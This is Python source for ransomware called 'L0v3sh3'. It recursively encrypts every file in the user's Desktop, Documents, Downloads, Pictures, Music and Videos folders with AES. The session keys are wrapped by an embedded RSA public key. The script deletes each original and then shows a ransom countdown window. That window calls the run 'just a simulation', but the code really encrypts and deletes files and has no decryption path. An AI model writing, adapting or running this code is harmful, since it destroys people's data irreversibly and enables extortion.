import base64
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import tkinter as tk

# Public key with base64 decoding
pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxZUs0TkppUGlaQ1o0aDRwM2lzNwpyOTdTRGRnaWtrckswNE1sc3oraHY2UmIxKzB2M1hsY296QXVGeGIvMjkxTE5tNGs1M1RZTXQ4M3BPRm9ZRTh4Ckx0VE55UVNSMDR2dzBGcGRwU3Y1YVVjbysxRmtwRjRMdCtqV1Q0YjVrTUFqWTRkOW5Yb3lRQmxJbzBWckMwQzIKcldpeklONGV1TXBTbll3V2Z0a2JsZE5qcDJ1U0hFeWM1Z0FZR1ZKSWZ6TVRiaUxZd0k5aU9rNllnWEozbWJLdAp1dHo2WlRTdlplVzEwaUhrc2JXUXgvcUVjR0JLWFJUbkUvYTJkZVhvRThRaFZOTUV5Z0xVQmF3NERYaWRCbXBiCnFmSWtvZk5UWlQ3K2NyaENocVptYmFrSjA5bTdmT3k1TURud0oraU0wdlBheW1tdGduWnBrR0NQNlpDVDlkeHoKcHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
pubKey = base64.b64decode(pubKey)

# Target directories
target_directories = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Pictures"),
    os.path.expanduser("~/Music"),
    os.path.expanduser("~/Videos")
]

# List to store original file paths
original_files = []

def scanRecurse(baseDir):
    '''
    Recursively scan a directory and yield all files.
    '''
    try:
        for entry in os.scandir(baseDir):
            if entry.is_file():
                yield entry
            elif entry.is_dir():
                yield from scanRecurse(entry.path)
    except (PermissionError, FileNotFoundError) as e:
        print(f"Skipping {baseDir}: {e}")

def encrypt(dataFile, publicKey):
    '''
    Encrypt a file using RSA for the session key and AES for the data.
    '''
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    
    try:
        # Read data from file
        with open(dataFile, 'rb') as f:
            data = f.read()

        # Create public key object
        key = RSA.import_key(publicKey)
        sessionKey = os.urandom(16)

        # Encrypt the session key with the public key
        cipher = PKCS1_OAEP.new(key)
        encryptedSessionKey = cipher.encrypt(sessionKey)

        # Encrypt the data with the session key
        cipher = AES.new(sessionKey, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        # Save the encrypted data to file
        fileName = dataFile.split(extension)[0]
        encryptedFile = fileName + extension + '.L0v3sh3'
        with open(encryptedFile, 'wb') as f:
            [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
        
        # Remove the original file
        os.remove(dataFile)

        # Append the original file path to the list
        original_files.append(dataFile)
        print(f"Encrypted: {dataFile} -> {encryptedFile}")

    except Exception as e:
        print(f"Failed to encrypt {dataFile}: {e}")

# Loop through all target directories
for directory in target_directories:
    if os.path.exists(directory):
        print(f"Scanning directory: {directory}")
        for item in scanRecurse(directory):
            filePath = Path(item)
            fileType = filePath.suffix.lower()

            # Exclude certain file types
            excludeExtension = ['.py', '.pem', '.exe']
            if fileType in excludeExtension:
                continue

            # Encrypt the file
            encrypt(filePath, pubKey)

# Save the list of original file paths to a text file
log_file = "encrypted_files.txt"
with open(log_file, 'w') as f:
    for file in original_files:
        f.write(file + '\n')

print(f"List of encrypted files saved to: {log_file}")

# GUI Countdown
def countdown(count):
    '''
    Countdown timer for the ransomware GUI.
    '''
    hour, minute, second = map(int, count.split(':'))
    label['text'] = f'{hour:02}:{minute:02}:{second:02}'

    if hour > 0 or minute > 0 or second > 0:
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, f'{hour}:{minute}:{second}')

# Create ransomware GUI
root = tk.Tk()
root.title('L0v3sh3 Ransomware')
root.geometry('500x300')
root.resizable(False, False)

label1 = tk.Label(root, text="Your data has been encrypted!\nThis is just a simulation.\n\n", font=('calibri', 12, 'bold'))
label1.pack()

label = tk.Label(root, font=('calibri', 50, 'bold'), fg='white', bg='blue')
label.pack()

# Start countdown
countdown('01:30:00')

root.mainloop()
